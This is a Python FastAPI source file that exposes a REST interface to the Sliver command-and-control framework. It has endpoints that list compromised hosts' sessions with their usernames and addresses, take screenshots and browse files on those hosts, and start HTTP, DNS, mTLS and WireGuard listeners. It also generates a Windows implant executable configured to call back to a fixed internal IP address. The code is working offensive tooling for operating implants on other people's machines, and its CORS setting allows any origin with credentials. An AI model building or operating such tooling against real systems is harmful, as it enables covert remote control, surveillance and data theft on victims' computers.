import os
from contextlib import asynccontextmanager
from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import Dict, Optional
from sliver import SliverClientConfig, SliverClient
from sliver import client_pb2
import asyncio
import time
from fastapi import Query
from fastapi.responses import JSONResponse
import base64
from fastapi.responses import Response
from fastapi import status
from datetime import datetime   

class CommandItem(BaseModel):
    command: str

class ListenerCommandItem(BaseModel):
    command: str
    config: Optional[Dict] = {}

class GenerateCommandItem(BaseModel):
    command: str
    config: Optional[Dict] = {}

class Session(BaseModel):
    id: str
    name: str
    hostname: str
    username: str
    uid: str
    os: str
    arch: str
    transport: str
    remote_address: str
    pid: int
    filename: str
    last_checkin: str
    active_c2: str
    version: str

class ErrorResponse(BaseModel):
    detail: str

# Global client instance
_client = None
_current_interactive_session = None

@asynccontextmanager
async def lifespan(app: FastAPI):
    """Manage the Sliver client lifecycle"""
    global _client
    # Startup code — no connection now
    yield
    # Shutdown code
    if _client is not None:
        await _client.close()
        _client = None

app = FastAPI(
    title="Sliver API",
    description="REST API for interacting with Sliver C2",
    version="1.0.0",
    lifespan=lifespan
)

# Configure CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

async def get_client() -> SliverClient:
    """Get the Sliver client instance"""
    global _client
    if _client is None:
        raise HTTPException(status_code=500, detail="Sliver client not initialized")
    return _client

# @app.get("/sessions/{session_id}")
async def get_session(session_id: str):
    """Get details for a specific session"""
    print("request to session came")
    try:
        client = await get_client()
        sessions = await client.sessions()
        for session in sessions:
            if session.ID == session_id:
                return client
        raise HTTPException(status_code=404, detail="Session not found")
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

def unix_timestamp_to_time(timestamp):
    """Convert a Unix timestamp to a human-readable datetime string."""
    return datetime.fromtimestamp(timestamp).strftime('%d/%m/%y %H:%M %Z')

@app.get("/sessions/{session_id}/files")
async def list_files(session_id: str, path: Optional[str] = Query("/")):
    try:
        client = await get_client()
        sessions = await client.sessions()
        session_obj = next((s for s in sessions if s.ID == session_id), None)

        if not session_obj:
            raise HTTPException(status_code=404, detail="Session not found")

        global _current_interactive_session
        _current_interactive_session = await client.interact_session(session_id)
        return {
            "status": session_obj.IsDead, 
            "session_id": session_obj.ID, 
            "Name": session_obj.Name,
            "Hostname" : session_obj.Hostname,
            "Username" : session_obj.Username,
            "UID" : session_obj.UID,
            "GID" : session_obj.GID,
            "OS" : session_obj.OS,
            "Arch" : session_obj.Arch,
            "Remote Address" : session_obj.RemoteAddress,
            "PID" : session_obj.PID,
            "Filename" : session_obj.Filename,
            "Active C2": session_obj.ActiveC2,
            "Version" : session_obj.Version,               
            "Reconnect Interval": session_obj.ReconnectInterval,
            "Proxy URL": session_obj.ProxyURL,
            "Burned" : session_obj.Burned,
            "Extensions" :session_obj.Extensions,
            # "Config": session_obj.config
            }

    except Exception as e:
        print(f"Error connecting to session: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/screenshot")
async def get_screenshot():
    global _current_interactive_session
    try:
        # Get screenshot from sliver session
        screenshot_pb = await _current_interactive_session.screenshot()
        # Extract PNG data from protobuf
        png_data = screenshot_pb.Data  # or screenshot_pb.image_data
        # Return as image response
        return Response(
            content=png_data,
            media_type="image/png",
            headers={"Cache-Control": "no-cache"}
        )
        
    except Exception as e:
        print("error: ", e)
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/connected")
async def connected_or_not():
    global _client
    return _client is not None and _client.is_connected()

@app.get("/operators")
async def list_operators():
    """List all operators"""
    print("request to operators came")
    try:
        client = await get_client()
        operators = await client.operators()
        obj_to_be_returned = []
        id = 1
        for op in operators:
            obj_to_be_returned.append({"id": id, "name": op.Name, "isOnline":op.Online})
            id += 1
        return obj_to_be_returned
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/connect")
async def connect_sliver():
    """Connect to Sliver server"""
    print("connect request came")
    try :
        global _client
        print(_client)
        if _client is None:
            config = SliverClientConfig.parse_config_file(os.path.join('./arjun.cfg'))
            _client = SliverClient(config)
        if not _client.is_connected():
            await _client.connect()
        return True
    except Exception as e:
        print("COULD NOT ESTABLISH CONNECTION WITH SLIVER SERVER!!!!")
        print(e)    
        _client = None
        return False

@app.get("/sessions")
async def list_sessions():
    print("request to sessions came")
    """List all active sessions"""
    try:
        client = await get_client()
        sessions = await client.sessions()
        sessions_to_be_returned = []
        for session in sessions:
            sessions_to_be_returned.append({"id":session.ID, "hostname":session.Hostname, "username":session.Username, "transport":session.Transport, "remoteaddress":session.RemoteAddress, "os":session.OS, "firstContact":unix_timestamp_to_time(session.FirstContact), "isDead":session.IsDead, "lastCheckIn":unix_timestamp_to_time(session.LastCheckin), "_lastCheckInTimestamp": session.LastCheckin})
        sessions_to_be_returned.sort(key=lambda x: x["_lastCheckInTimestamp"], reverse=True)
        return sessions_to_be_returned
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))
    
@app.get("/jobs")
async def list_jobs():
    print("request to jobs came")
    """List all active jobs"""
    try:
        client = await get_client()
        jobs = await client.jobs()
        jobs_to_be_returned = []
        for job in jobs:
            jobs_to_be_returned.append({"id":job.ID, "name":job.Name, "port":job.Port, "protocol":job.Protocol})
        jobs_to_be_returned.sort(key=lambda x: x["id"], reverse=False)
        return jobs_to_be_returned
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/interactwithsession")
async def interact_with_session(item: CommandItem):
    print("Interact with session request came: ")
    global _current_interactive_session
    if _current_interactive_session is None:
        raise HTTPException(status_code=400, detail="Session not initialized")
    
    # print(item)
    commands = [item.strip() for item in item.command.split(',')]
    print(commands)
    
    try:
        result = "" 
        if (commands[0] == 'ls'):
            # print("executing ls command")
            result = await _current_interactive_session.ls()
            # print(result)
        elif (commands[0] == 'cd'):
            result = await _current_interactive_session.cd(commands[1])
            print(result)
        elif (commands[0] == 'screenshot'):
            result = await _current_interactive_session.screenshot()
            # print(result)
            # png_data = result.data
            # print(result)
            base64_data = base64.b64encode(result).decode("utf-8")
            return JSONResponse(content={"image": base64_data})

        return {
            "status": "success",
            "result":str(result),
        }

    except Exception as e:
        print("error: ", e)
        return {
            "status": "error",
            "detail": str(e)
        }

@app.post("/interactwithlisteners")
async def interact_with_session(item: ListenerCommandItem):
    print("Interact with listeners request came: ")
    global _client
    if _client is None:
        raise HTTPException(status_code=400, detail="Session not initialized")
    command = item.command.lower()
    config = item.config or {}
    print(command, config)
    
    try:
        result = ""
        if command == 'http':
            result = await _client.start_http_listener(
                host=config.get("host", "0.0.0.0"),
                port=config.get("port", 80),
                persistent=config.get("persistent", False),
                timeout=config.get("timeout", 60)
            )
        elif command == 'https':
            result = await _client.start_https_listener()
        elif command == 'dns':
            result = await _client.start_dns_listener(domains="")
        elif command == 'mtls':
            result = await _client.start_mtls_listener()
        elif command == 'wg':
            result = await _client.start_wg_listener(tun_ip="")
        else:
            raise HTTPException(status_code=400, detail=f"Unknown command: {command}")

        return {
            "status": "success",
            "result": str(result),
        }

    except Exception as e:
        print("error: ", e)
        return {
            "status": "error",
            "detail": str(e)
        }
    
@app.post("/interactwithGenerate")
async def interact_with_generate(item: GenerateCommandItem):
    print("Generate request came: ")
    global _client
    if _client is None:
        raise HTTPException(status_code=400, detail="Session not initialized")
    command = item.command.lower()
    config = item.config or {}
    print(command, config)
    # print(list(client_pb2.OutputFormat.keys()))
    try:
        result = ""
        if command == "implant":
            implant_config = client_pb2.ImplantConfig(
                ID="test-implant",
                IsBeacon=False,
                # BeaconInterval=30,
                # BeaconJitter=20,
                GOOS="windows",
                GOARCH="amd64",
                Name="TestImplant1113",
                Debug=False,
                Evasion=False,
                ObfuscateSymbols=False,
                Format=client_pb2.OutputFormat.Value("EXECUTABLE"),
                # IsSharedLib=False,
                # IsService=False,
                # IsShellcode=False,
                # RunAtLoad=False,
                FileName="implant2.exe",
                C2=[
                    client_pb2.ImplantC2(
                        Priority=0,
                        URL="http://192.168.104.137",
                        Options=""
                    )
                ],
            )
            response = await _client.generate_implant(implant_config)
            print(dir(response))
            print(dir(response.File))
            print(response.ListFields())
            print(response.ByteSize())
            # response_bytes = response.Data
            # Save it as a file on disk
            file_path = "implant_output/implant.exe"
            with open(file_path, "wb") as f:
                f.write(response.File.Data)

            print(f"File saved at: {file_path}")
            return {"status": "success", "detail": f"File saved at {file_path}"}
            return Response(
                content=response,
                media_type="application/octet-stream",
                headers={"Content-Disposition": "attachment; filename=implant.exe"},
                status_code=status.HTTP_200_OK
            )
        else:
            raise HTTPException(status_code=400, detail=f"Unknown command: {command}")

        return {
            "status": "success",
            "result": str(result),
        }

    except Exception as e:
        print("error: ", e)
        return {
            "status": "error",
            "detail": str(e)
        }

@app.get("/health")
async def health_check():
    """Service health check"""
    return {"status": "healthy"}
